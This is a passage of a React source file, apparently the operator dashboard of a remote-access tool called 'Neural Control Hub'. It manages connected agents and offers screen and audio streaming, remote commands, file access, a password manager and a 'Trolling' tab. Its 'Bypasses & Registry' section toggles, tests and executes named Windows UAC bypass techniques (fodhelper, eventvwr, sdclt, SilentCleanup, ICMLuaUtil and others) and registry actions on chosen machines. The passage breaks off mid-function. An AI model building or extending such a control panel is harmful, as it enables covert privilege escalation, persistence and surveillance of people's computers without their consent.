import { useState, useEffect, lazy, Suspense } from "react";
import { useSocket } from "./components/SocketProvider";
import { AgentCard } from "./components/AgentCard";
import { StreamViewer } from "./components/StreamViewer";
import { CommandPanel } from "./components/CommandPanel";
import { SystemMonitor } from "./components/SystemMonitor";
import { FileManager } from "./components/FileManager";
import { Header } from "./components/Header";
import { Sidebar } from "./components/Sidebar";
import { SearchAndFilter } from "./components/SearchAndFilter";
import { ActivityFeed } from "./components/ActivityFeed";
import { UpdateClientPanel } from "./components/UpdateClientPanel";
import { ChromeExtensionPanel } from "./components/ChromeExtensionPanel";
import { QuickActions } from "./components/QuickActions";
import { PasswordManager } from "./components/PasswordManager";
 const SettingsLazy = lazy(() =>
   import("./components/Settings").then((mod) => ({ default: mod.Settings }))
 );
 const AboutLazy = lazy(() =>
   import("./components/About").then((mod) => ({ default: mod.About }))
 );
                                    
 import { BulkUploadManager } from "./components/bulkuploadmanager.tsx";
 const ProcessManagerLazy = lazy(() =>
   import("./components/ProcessManager").then((mod) => ({ default: mod.ProcessManager }))
 );
 import { VirtualDesktop } from "./components/VirtualDesktop";
import { ThemeProvider } from "./components/ThemeProvider";
import { ErrorBoundary } from "./components/ErrorBoundary";
import { Login } from "./components/Login";
import { Toaster, toast } from "./components/ui/sonner";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "./components/ui/tabs";
import { apiClient } from "./services/api";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "./components/ui/card";
import { Badge } from "./components/ui/badge";
import { Button } from "./components/ui/button";
import { Switch } from "./components/ui/switch";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./components/ui/select";
import { Label } from "./components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter,
} from "./components/ui/dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "./components/ui/table";
import { Progress } from "./components/ui/progress";
import { 
  AlertCircle, 
  CheckCircle2, 
  Circle, 
  HelpCircle, 
  ShieldAlert, 
  Play, 
  Zap,
  Shield,
  Monitor,
  Terminal,
  Files,
  Activity,
  Settings as SettingsIcon,
  Users,
  Wifi
} from "lucide-react";

interface Agent {
  id: string;
  name: string;
  alias?: string;
  rawName?: string;
  status: "online" | "offline";
  platform: string;
  ip: string;
  lastSeen: Date;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
  is_admin?: boolean;
}

type FilterOptions = {
  status: string[];
  platform: string[];
  capabilities: string[];
};

// Live agents come from SocketProvider via agent_list_update

function AppContent() {
  const { agents: liveAgents, connected, authenticated, agentConfig, sendCommand, lastActivity, selectedAgent, setSelectedAgent, agentMetrics, streamsActiveCount, commandsExecutedCount } = useSocket() as {
    agents: Agent[];
    connected: boolean;
    authenticated: boolean;
    agentConfig: Record<string, any>;
    sendCommand: (agentId: string, command: string) => void;
    lastActivity: any;
    selectedAgent: string | null;
    setSelectedAgent: (agentId: string | null) => void;
    agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
    streamsActiveCount: number;
    commandsExecutedCount: number;
  };
  const [activeTab, setActiveTab] = useState("overview");
  const [bypassData, setBypassData] = useState<{ methods: Array<{key: string; enabled: boolean}>, sequence: Array<{id: number; name: string}> } | null>(null);
  const [registryData, setRegistryData] = useState<{ actions: Array<{key: string; enabled: boolean}> } | null>(null);
  const [globalBypassesEnabled, setGlobalBypassesEnabled] = useState(false);
  const [globalRegistryEnabled, setGlobalRegistryEnabled] = useState(false);
  const [targetAgentId, setTargetAgentId] = useState<string | null>(null);
  const [agentAdminStatus, setAgentAdminStatus] = useState<Record<string, boolean>>({});
  const api = apiClient;
  const [toolsTab, setToolsTab] = useState<string>(() => {
    try {
      return localStorage.getItem('nch:tab:tools') || 'terminal';
    } catch {
      return 'terminal';
    }
  });

  // System Scan State
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanResults, setScanResults] = useState<{
    type: 'bypass' | 'registry';
    name: string;
    key: string;
    enabled: boolean;
    status: 'verified' | 'toggle_only' | 'error' | 'missing' | 'unknown';
    message: string;
    details?: string;
  }[]>([]);
  const [isScanDialogOpen, setIsScanDialogOpen] = useState(false);
  
  // Helper function to format registry key names
  const fmt = (k: string) =>
    k.replace(/_/g, ' ')
      .replace(/\b\w/g, (c) => c.toUpperCase());
  const [agents, setAgents] = useState<Agent[]>(liveAgents as Agent[]);
  const networkActivity = (() => {
    try {
      const online = agents.filter(a => a.status === 'online');
      if (online.length === 0) return 0;
      const total = online.reduce((acc, a) => {
        const live = a.id ? agentMetrics[a.id] : undefined;
        const v = live?.network ?? a.performance.network ?? 0;
        return acc + (Number.isFinite(Number(v)) ? Number(v) : 0);
      }, 0);
      return total;
    } catch {
      return 0;
    }
  })();

  const handleSystemScan = async () => {
    setIsScanning(true);
    setScanProgress(0);
    setScanResults([]);
    setIsScanDialogOpen(true);
    
    try {
      // 1. Fetch latest data
      const bypassesRes = await api.getBypasses();
      const registryRes = await api.getRegistry();
      
      const bypasses = bypassesRes.success ? (bypassesRes.data as any).methods || [] : [];
      const registry = registryRes.success ? (registryRes.data as any).actions || [] : [];
      
      const totalItems = bypasses.length + registry.length;
      let processed = 0;
      const results: typeof scanResults = [];

      // 2. Scan Bypasses
      for (const bypass of bypasses) {
        let status: any = 'unknown';
        let message = '';
        let details = '';
        
        try {
            const testRes = await api.testBypass(bypass.key);
            
            if (testRes.success) {
                const result = (testRes.data as any)?.result;
                if (result?.executed) {
                    status = 'verified';
                    message = 'Successfully executed and verified';
                } else {
                    status = 'toggle_only';
                    message = 'Toggle switch only - No active execution detected';
                }
            } else {
                status = 'error';
                message = testRes.error || 'Execution check failed';
            }
        } catch (e) {
            status = 'error';
            message = 'Connection error during verification';
        }

        const nameMap: Record<string, string> = {
            cleanmgr_sagerun: 'Cleanmgr.exe /SAGERUN',
            fodhelper: 'Fodhelper ms-settings',
            computerdefaults: 'ComputerDefaults',
            eventvwr: 'EventVwr.exe hijacking',
            sdclt: 'sdclt.exe bypass',
            wsreset: 'WSReset.exe bypass',
            slui: 'slui.exe hijacking',
            winsat: 'winsat.exe bypass',
            silentcleanup: 'SilentCleanup task',
            icmluautil: 'ICMLuaUtil COM',
            runas_prompt: 'RunAs Admin Prompt'
        };

        results.push({
            type: 'bypass',
            name: nameMap[bypass.key] || bypass.key,
            key: bypass.key,
            enabled: bypass.enabled,
            status,
            message,
            details
        });
        
        processed++;
        setScanProgress(Math.round((processed / totalItems) * 100));
        setScanResults([...results]);
        await new Promise(r => setTimeout(r, 100));
      }

      // 3. Scan Registry
      for (const reg of registry) {
        let status: any = 'unknown';
        let message = '';
        let details = '';
        
        try {
            const presenceRes = await api.checkRegistryPresence(reg.key);
            const isPresent = presenceRes.success && (presenceRes.data as any)?.result?.present;
            const path = (presenceRes.data as any)?.result?.path;
            
            const testRes = await api.testRegistry(reg.key);
            
            if (testRes.success) {
                const result = (testRes.data as any)?.result;
                if (result?.executed) {
                    status = 'verified';
                    message = isPresent ? 'Verified present and executable' : 'Executable (Key currently missing)';
                    details = path ? `Path: ${path}` : '';
                } else if (result?.need_admin) {
                     status = 'error';
                     message = 'Requires Admin privileges';
                } else {
                    status = 'toggle_only';
                    message = 'Toggle switch only - No active execution detected';
                }
            } else {
                status = 'error';
                message = testRes.error || 'Execution check failed';
            }
            
        } catch (e) {
            status = 'error';
            message = 'Connection error during verification';
        }

        results.push({
            type: 'registry',
            name: fmt(reg.key),
            key: reg.key,
            enabled: reg.enabled,
            status,
            message,
            details
        });

        processed++;
        setScanProgress(Math.round((processed / totalItems) * 100));
        setScanResults([...results]);
        await new Promise(r => setTimeout(r, 100));
      }
      
    } catch (error) {
        console.error('Scan failed', error);
        toast.error('Diagnostic scan failed to start');
    } finally {
        setIsScanning(false);
    }
  };

  useEffect(() => {
    setAgents(liveAgents);
  }, [liveAgents]);
  useEffect(() => {
    (async () => {
      if (activeTab === 'security') {
        const b = await api.getBypasses();
        const r = await api.getRegistry();
        if (b.success) {
          setBypassData(b.data as any);
        }
        if (r.success) {
          setRegistryData(r.data as any);
        }
      }
    })();
  }, [activeTab]);

  useEffect(() => {
    (async () => {
      if (targetAgentId) {
        try {
          // Fetch current admin status for the selected agent
          // For now, we'll check the local state or assume false initially
          // In the future, we could add an endpoint to fetch current admin status
          if (!(targetAgentId in agentAdminStatus)) {
            // Initialize with false if not set
            setAgentAdminStatus(prev => ({ ...prev, [targetAgentId]: false }));
          }
        } catch (error) {
          console.error('Error fetching admin status:', error);
        }
      }
    })();
  }, [targetAgentId]);
  const [searchTerm, setSearchTerm] = useState("");
  const [filters, setFilters] = useState<FilterOptions>({
    status: [],
    platform: [],
    capabilities: [],
  });
  const [sortBy, setSortBy] = useState("name");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">(
    "asc",
  );

  useEffect(() => {
    try {
      const url = new URL(window.location.href);
      const qsTab = url.searchParams.get('tab');
      if (qsTab) {
        setActiveTab(qsTab);
        return;
      }
      const saved = localStorage.getItem('nch:tab:main');
      if (saved) setActiveTab(saved);
    } catch {}
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem('nch:tab:main', activeTab);
      const url = new URL(window.location.href);
      url.searchParams.set('tab', activeTab);
      window.history.replaceState({}, '', url.toString());
    } catch {}
  }, [activeTab]);

  useEffect(() => {
    const onNavigateTab = (e: any) => {
      const d = e?.detail || {};
      const t = String(d?.tab || '');
      if (t) setActiveTab(t);
      const aid = typeof d?.agentId === 'string' ? d.agentId : null;
      if (aid) setSelectedAgent(aid);
    };
    window.addEventListener('navigate_tab', onNavigateTab);
    return () => {
      window.removeEventListener('navigate_tab', onNavigateTab);
    };
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem('nch:tab:tools', toolsTab);
    } catch {}
  }, [toolsTab]);

  useEffect(() => {
    const firstOnline = agents.find(a => a.status === 'online') || null;
    if (!selectedAgent && firstOnline) {
      setSelectedAgent(firstOnline.id);
      return;
    }
    if (selectedAgent) {
      const current = agents.find(a => a.id === selectedAgent);
      if (current && current.status !== 'online' && firstOnline && firstOnline.id !== selectedAgent) {
        setSelectedAgent(firstOnline.id);
      }
    }
  }, [agents, selectedAgent]);

  // Show login screen if not authenticated
  if (!authenticated) {
    return <Login />;
  }

  // Show loading screen while connecting
  if (!connected) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center space-y-4">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
          <p className="text-muted-foreground">Connecting to Neural Control Hub...</p>
        </div>
      </div>
    );
  }

  const onlineAgents = agents.filter(
    (agent: Agent) => agent.status === "online",
  );

  // Advanced filtering and sorting
  const filteredAgents = agents
    .filter((agent: Agent) => {
      // Text search
      const matchesSearch =
        searchTerm === "" ||
        agent.name
          .toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        agent.platform
          .toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        agent.ip.includes(searchTerm);

      // Status filter
      const matchesStatus =
        filters.status.length === 0 ||
        filters.status.includes(agent.status);

      // Platform filter
      const matchesPlatform =
        filters.platform.length === 0 ||
        filters.platform.some((platform) =>
          agent.platform.includes(platform),
        );

      // Capabilities filter
      const matchesCapabilities =
        filters.capabilities.length === 0 ||
        filters.capabilities.every((capability) =>
          agent.capabilities.includes(capability),
        );

      return (
        matchesSearch &&
        matchesStatus &&
        matchesPlatform &&
        matchesCapabilities
      );
    })
    .sort((a: Agent, b: Agent) => {
      let aValue, bValue;

      switch (sortBy) {
        case "status":
          aValue = a.status;
          bValue = b.status;
          break;
        case "platform":
          aValue = a.platform;
          bValue = b.platform;
          break;
        case "lastSeen":
          aValue = a.lastSeen ? a.lastSeen.getTime() : 0;
          bValue = b.lastSeen ? b.lastSeen.getTime() : 0;
          break;
        case "performance":
          aValue = a.performance.cpu + a.performance.memory;
          bValue = b.performance.cpu + b.performance.memory;
          break;
        default:
          aValue = a.name;
          bValue = b.name;
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1;
      } else {
        return aValue < bValue ? 1 : -1;
      }
    });

  const availableFilters: { platforms: string[]; capabilities: string[] } = {
    platforms: [
      ...new Set(
        agents.map((agent: Agent) => agent.platform.split(" ")[0]),
      ),
    ] as string[],
    capabilities: [
      ...new Set(agents.flatMap((agent: Agent) => agent.capabilities)),
    ] as string[],
  };

  const handleAgentSelect = () => {
    const firstOnlineAgent = onlineAgents[0];
    if (firstOnlineAgent) {
      setSelectedAgent(firstOnlineAgent.id);
    }
  };

  const handleAgentDeselect = () => {
    setSelectedAgent(null);
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="flex h-screen">
        {/* Sidebar - Fixed width on desktop, hidden on mobile */}
        <ErrorBoundary>
          <Sidebar
            activeTab={activeTab}
            onTabChange={setActiveTab}
            agentCount={onlineAgents.length}
          />
        </ErrorBoundary>

        {/* Main content area */}
        <div className="flex-1 flex flex-col min-w-0">
          <ErrorBoundary>
            <Header
              activeTab={activeTab}
              onTabChange={setActiveTab}
              onAgentSelect={handleAgentSelect}
              onAgentDeselect={handleAgentDeselect}
              agentCount={onlineAgents.length}
            />
          </ErrorBoundary>

          <main className="flex-1 overflow-auto">
            <ErrorBoundary>
              <div className="p-4 sm:p-6 space-y-6">

            {/* Overview Stats - only show for overview tab */}
            {activeTab === "overview" &&
              !["settings", "about"].includes(activeTab) && (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Total Agents
                      </CardTitle>
                      <Users className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">
                        {agents.length}
                      </div>
                      <p className="text-xs text-muted-foreground">
                        {onlineAgents.length} online
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Active Streams
                      </CardTitle>
                      <Monitor className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">{streamsActiveCount}</div>
                      <p className="text-xs text-muted-foreground">
                        Screen + Audio
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Commands Executed
                      </CardTitle>
                      <Terminal className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">{commandsExecutedCount}</div>
                      <p className="text-xs text-muted-foreground">
                        Session count
                      </p>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                      <CardTitle className="text-sm font-medium">
                        Network Activity
                      </CardTitle>
                      <Activity className="h-4 w-4 text-muted-foreground" />
                    </CardHeader>
                    <CardContent>
                      <div className="text-2xl font-bold">
                        {networkActivity.toFixed(1)} MB/s
                      </div>
                      <p className="text-xs text-muted-foreground">
                        Data transferred
                      </p>
                    </CardContent>
                  </Card>
                </div>
              )}

            {/* Advanced Search and Filter - only for main tabs */}
            {!["settings", "about"].includes(activeTab) && (
              <SearchAndFilter
                searchTerm={searchTerm}
                onSearchChange={setSearchTerm}
                onFiltersChange={(next) => setFilters(next)}
                onSortChange={(sortBy, sortOrder) => {
                  setSortBy(sortBy);
                  setSortOrder(sortOrder);
                }}
                availableFilters={availableFilters}
                resultCount={filteredAgents.length}
              />
            )}

            {/* Only show search and tabs for main content, not settings/about */}
            {!["settings", "about"].includes(activeTab) && (
              <Tabs
                value={activeTab}
                onValueChange={setActiveTab}
                className="space-y-6"
              >
                <TabsList className="w-full h-auto flex flex-wrap gap-2 justify-start">
                  <TabsTrigger value="overview" className="text-xs sm:text-sm">
                    Overview
                  </TabsTrigger>
                  <TabsTrigger value="trolling" className="text-xs sm:text-sm">
                    Trolling
                  </TabsTrigger>
                  <TabsTrigger value="agents" className="text-xs sm:text-sm">
                    Agents
                  </TabsTrigger>
                  <TabsTrigger value="streaming" className="text-xs sm:text-sm">
                    Streaming
                  </TabsTrigger>
                  <TabsTrigger value="virtual" className="text-xs sm:text-sm">
                    Virtual Desktop
                  </TabsTrigger>
                  <TabsTrigger value="security" className="text-xs sm:text-sm">
                    Bypasses & Registry
                  </TabsTrigger>
                  <TabsTrigger value="commands" className="text-xs sm:text-sm">
                    Commands
                  </TabsTrigger>
                  <TabsTrigger value="files" className="text-xs sm:text-sm">
                    Files
                  </TabsTrigger>
                  <TabsTrigger value="password_manager" className="text-xs sm:text-sm">
                    Password Manager
                  </TabsTrigger>
                  <TabsTrigger value="update_client" className="text-xs sm:text-sm">
                    Updater
                  </TabsTrigger>
                  <TabsTrigger value="chrome_extension" className="text-xs sm:text-sm">
                    Chrome Extension
                  </TabsTrigger>
                  
                </TabsList>
                <div className="text-xs text-muted-foreground">
                  {lastActivity?.type
                    ? (String(lastActivity.type).startsWith('files')
                        ? `Last: Files ${lastActivity.details || ''}`
                        : String(lastActivity.type).startsWith('stream:')
                          ? `Last: ${String(lastActivity.type).replace('stream:', '').toUpperCase()} stream ${lastActivity.details || ''}`
                          : null)
                    : null}
                </div>

                <TabsContent
                  value="overview"
                  className="space-y-6"
                >
                  <Card>
                    <CardHeader>
                      <CardTitle>System Overview</CardTitle>
                      <CardDescription>
                        Real-time status of all connected agents
                        and system performance
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-6">
                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-stretch">
                          <div className="lg:col-span-2 h-[300px] sm:h-[420px]">
                            <ActivityFeed />
                          </div>
                          <div className="h-[300px] sm:h-[420px]">
                            <SystemMonitor />
                          </div>
                        </div>

                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-stretch">
                          <div className="min-h-[300px]">
                            <QuickActions
                            agentCount={onlineAgents.length}
                            selectedAgent={selectedAgent}
                            />
                          </div>
                          <Card className="min-h-[300px] flex flex-col">
                            <CardHeader>
                              <CardTitle>Security Overview</CardTitle>
                              <CardDescription>
                                UAC bypass and registry status
                              </CardDescription>
                            </CardHeader>
                            <CardContent className="flex-1 overflow-visible">
                              {(() => {
                                const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                                const cfg = aid ? agentConfig?.[aid] : null;
                                const bEnabled = Boolean(cfg?.bypasses?.enabled);
                                const rEnabled = Boolean(cfg?.registry?.enabled);
                                const uacEnabled = Boolean(cfg?.agent?.enableUACBypass);
                                const pPrompt = Boolean(cfg?.agent?.persistentAdminPrompt);
                                const methods = cfg?.bypasses?.methods || {};
                                const actions = cfg?.registry?.actions || {};
                                const methodCount = Object.values(methods).filter(Boolean).length;
                                const actionCount = Object.values(actions).filter(Boolean).length;
                                return (
                                  <div className="space-y-3">
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">UAC Bypass</span>
                                      <Badge variant={uacEnabled && bEnabled ? "default" : "secondary"}>
                                        {uacEnabled && bEnabled ? "Enabled" : "Disabled"}
                                      </Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Persistent Admin Prompt</span>
                                      <Badge variant={pPrompt ? "default" : "secondary"}>
                                        {pPrompt ? "On" : "Off"}
                                      </Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Registry Controls</span>
                                      <Badge variant={rEnabled ? "default" : "secondary"}>
                                        {rEnabled ? "Enabled" : "Disabled"}
                                      </Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Enabled UAC Methods</span>
                                      <Badge variant="secondary">{methodCount}</Badge>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-sm">Enabled Registry Actions</span>
                                      <Badge variant="secondary">{actionCount}</Badge>
                                    </div>
                                    {aid && cfg ? (
                                      <div className="text-xs text-muted-foreground">
                                        Agent {aid.slice(0, 8)} • Updated {cfg.updatedAt ? new Date(cfg.updatedAt).toLocaleTimeString() : "—"}
                                      </div>
                                    ) : (
                                      <div className="text-xs text-muted-foreground">Select an agent to view security overview</div>
                                    )}
                                  </div>
                                );
                              })()}
                            </CardContent>
                          </Card>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
                
                <TabsContent value="security" className="space-y-6">
                  <div className="mb-4 flex items-center gap-4">
                    <div>
                      <label className="text-sm font-medium mr-2">Target Agent</label>
                      <Select
                        value={targetAgentId || 'global'}
                        onValueChange={(value) => setTargetAgentId(value === 'global' ? null : value)}
                      >
                        <SelectTrigger className="w-[300px]">
                          <SelectValue placeholder="Select target agent" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="global">Global</SelectItem>
                          {onlineAgents.map((agent) => (
                            <SelectItem key={agent.id} value={agent.id}>
                              {agent.name} ({agent.ip})
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                    {targetAgentId && (
                      <div>
                        <label className="text-sm font-medium mr-2">Admin Status</label>
                        <Button
                          variant={agentAdminStatus[targetAgentId] ? "default" : "outline"}
                          size="sm"
                          onClick={async () => {
                            try {
                              const newStatus = !agentAdminStatus[targetAgentId];
                              const res = await api.setAgentAdminStatus(targetAgentId, newStatus);
                              if (res.success) {
                                setAgentAdminStatus(prev => ({ ...prev, [targetAgentId]: newStatus }));
                                toast.success(`Agent ${targetAgentId.slice(0,8)} admin status ${newStatus ? 'enabled' : 'disabled'}`);
                              } else {
                                const errorMsg = res.error || 'Failed to update admin status';
                                toast.error(errorMsg);
                              }
                            } catch (error) {
                              console.error('Error updating admin status:', error);
                              toast.error('Failed to update admin status');
                            }
                          }}
                        >
                          {agentAdminStatus[targetAgentId] ? "Admin ✓" : "Set Admin"}
                        </Button>
                      </div>
                    )}
                  </div>
                  
                  <Card className="mb-6 border-primary/20 bg-primary/5">
                    <CardHeader className="pb-3">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <Activity className="h-5 w-5 text-primary" />
                                <div>
                                    <CardTitle>System Diagnostic Scan</CardTitle>
                                    <CardDescription>Comprehensive scan of all bypass and registry components</CardDescription>
                                </div>
                            </div>
                            <Button onClick={handleSystemScan} disabled={isScanning}>
                                {isScanning ? (
                                <>
                                    <Activity className="mr-2 h-4 w-4 animate-pulse" />
                                    Scanning... {scanProgress}%
                                </>
                                ) : (
                                <>
                                    <Play className="mr-2 h-4 w-4" />
                                    Run Full Scan
                                </>
                                )}
                            </Button>
                        </div>
                    </CardHeader>
                  </Card>

                  <Card>
                    <CardHeader>
                      <CardTitle>Bypasses</CardTitle>
                      <CardDescription>Parsed from agent client configuration</CardDescription>
                    </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div>
                      <div className="flex items-center justify-between mb-3">
                        <span className="text-sm font-medium">Global Bypasses</span>
                        <Switch
                          checked={globalBypassesEnabled}
                          onCheckedChange={async (checked) => {
                            const res = targetAgentId ? await api.setAgentGlobal(targetAgentId, checked, undefined) : await api.setBypassesGlobal(checked);
                            if (res.success) {
                              setGlobalBypassesEnabled(checked);
                              if (targetAgentId) {
                                const s = await api.getAgentSecurity(targetAgentId);
                                if (s.success) {
                                  const d = s.data as any;
                                  setBypassData({ methods: d.methods || [], sequence: (bypassData?.sequence || []) });
                                }
                              } else {
                                const b = await api.getBypasses();
                                if (b.success) setBypassData(b.data as any);
                              }
                              toast.success(`Bypasses ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : 'globally'}`);
                            } else {
                              const errorMsg = res.error || 'Failed to update global bypasses';
                              if (res.message?.includes('admin')) {
                                toast.error('Admin privileges required', { 
                                  description: 'Cannot modify bypasses without admin access. Please ensure the agent has admin privileges.' 
                                });
                              } else {
                                toast.error(errorMsg);
                              }
                            }
                          }}
                        />
                      </div>
                      <div className="text-sm font-medium mb-2">UAC Methods</div>
                      <div className="space-y-1">
                        {(() => {
                          const nameMap: Record<string, string> = {
                                cleanmgr_sagerun: 'Cleanmgr.exe /SAGERUN scheduled task',
                                fodhelper: 'Fodhelper ms-settings protocol',
                                computerdefaults: 'ComputerDefaults ms-settings protocol',
                                eventvwr: 'EventVwr.exe registry hijacking',
                                sdclt: 'sdclt.exe bypass',
                                wsreset: 'WSReset.exe bypass',
                                slui: 'slui.exe registry hijacking',
                                winsat: 'winsat.exe bypass',
                                silentcleanup: 'SilentCleanup scheduled task',
                                icmluautil: 'ICMLuaUtil COM interface',
                                runas_prompt: 'RunAs persistent admin prompt'
                              };
                          return (bypassData?.methods || []).map((m) => (
                            <div key={m.key} className="flex items-center justify-between text-sm">
                              <span>{nameMap[m.key] || m.key}</span>
                              <div className="flex items-center gap-2">
                                <Badge variant={m.enabled ? 'default' : 'secondary'}>
                                  {m.enabled ? 'Enabled' : 'Disabled'}
                                </Badge>
                                <Switch
                                  checked={m.enabled}
                                  onCheckedChange={async (checked) => {
                                    const res = targetAgentId ? await api.toggleAgentBypass(targetAgentId!, m.key, checked) : await api.toggleBypass(m.key, checked);
                                    if (res.success) {
                                      const d = res.data as any;
                                      setBypassData((prev) => ({ ...(prev || { methods: [], sequence: [] }), methods: d.methods || [] }));
                                      toast.success(`${m.key} ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : ''}`);
                                    } else {
                                      const errorMsg = res.error || 'Failed to update bypass';
                                      if (res.message?.includes('admin')) {
                                        toast.error('Admin privileges required', { 
                                          description: 'Cannot modify bypass without admin access. Please ensure the agent has admin privileges.' 
                                        });
                                      } else {
                                        toast.error(errorMsg);
                                      }
                                    }
                                  }}
                                />
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={async () => {
                                    const res = await api.testBypass(m.key);
                                    const ok = res.success && (res.data as any)?.result?.executed;
                                    const name = nameMap[m.key] || m.key;
                                    
                                    if (ok) {
                                      toast.success(`✅ Successfully executed bypass: ${name}`, {
                                        description: `The bypass method has been successfully applied to the agent.`
                                      });
                                    } else {
                                      toast.warning(`⚠️ Failed to execute bypass: ${name}`, {
                                        description: 'The bypass method could not be executed. This may be due to system restrictions or the bypass is not applicable in the current environment.'
                                      });
                                    }
                                  }}
                                >
                                  Test
                                </Button>
                              </div>
                            </div>
                          ));
                        })()}
                      </div>
                    </div>
                    <div>
                      <div className="flex items-center justify-between mb-3">
                        <span className="text-sm font-medium">Global Registry</span>
                        <Switch
                          checked={globalRegistryEnabled}
                          onCheckedChange={async (checked) => {
                            const res = targetAgentId ? await api.setAgentGlobal(targetAgentId, undefined, checked) : await api.setRegistryGlobal(checked);
                            if (res.success) {
                              setGlobalRegistryEnabled(checked);
                              if (targetAgentId) {
                                const s = await api.getAgentSecurity(targetAgentId);
                                if (s.success) {
                                  const d = s.data as any;
                                  setRegistryData({ actions: d.actions || [] });
                                }
                              } else {
                                const r = await api.getRegistry();
                                if (r.success) setRegistryData(r.data as any);
                              }
                              toast.success(`Registry ${checked ? 'enabled' : 'disabled'} ${targetAgentId ? `for agent ${targetAgentId.slice(0,8)}` : 'globally'}`);
                            } else {
                              const errorMsg = res.error || 'Failed to update global registry';
                              if (res.message?.includes('admin')) {
                                toast.error('Admin privileges required', { 
                                  description: 'Cannot modify registry without admin access. Please ensure the agent has admin privileges.' 
                                });
                              } else {
                                toast.error(errorMsg);
                              }
                            }
                          }}
                        />
                      </div>
                      <div className="text-sm font-medium mb-2">Sequence</div>
                      <div className="space-y-1">
                        {(bypassData?.sequence || []).map((s) => (
                          <div key={s.id} className="flex items-center justify-between text-sm">
                            <span>{s.name}</span>
                            <Badge variant="secondary">#{s.id}</Badge>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
              <Card>
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <div>
                      <CardTitle>Registry Actions</CardTitle>
                      <CardDescription>Parsed from agent client configuration</CardDescription>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={async () => {
                        if (!registryData?.actions?.length) {
                          toast.warning('No registry actions available');
                          return;
                        }

                        const enabledActions = registryData.actions.filter(a => a.enabled);
                        if (enabledActions.length === 0) {
                          toast.warning('No registry actions are enabled');
                          return;
                        }

                        toast.info('🔄 Testing all enabled registry actions...', {
                          description: `Testing ${enabledActions.length} enabled registry actions`
                        });

                        const results = [];
                        for (const action of enabledActions) {
                          try {
                            // First check presence
                            const presenceRes = await api.checkRegistryPresence(action.key);
                            const isPresent = presenceRes.success && (presenceRes.data as any)?.result?.present;
                            const registryPath = (presenceRes.data as any)?.result?.path;
                            const currentValue = (presenceRes.data as any)?.result?.value;
                            
                            // Then test the registry action
                            const res = await api.testRegistry(action.key);
                            const ok = res.success && (res.data as any)?.result?.executed;
                            const needAdmin = (res.data as any)?.result?.need_admin;
                            const name = fmt(action.key);
                            
                            results.push({
                              name,
                              key: action.key,
                              success: ok,
                              needAdmin: needAdmin,
                              wasPresent: isPresent,
                              error: !res.success ? res.error : null
                            });

                            // Individual notification for each test with presence info
                            if (isPresent) {
                              toast.info(`🔍 ${name} already exists`, {
                                description: `Registry key found at: ${registryPath}${currentValue ? ` (Value: ${JSON.stringify(currentValue)})` : ''}`
                              });
                            } else {
                              toast.warning(`🔍 ${name} not found`, {
                                description: 'Registry key does not exist in the Windows Registry Editor'
                              });
                            }

                            if (ok) {
                              toast.success(`✅ ${name} test successful`, {
                                description: 'Registry key created/updated successfully'
                              });
                            } else if (needAdmin) {
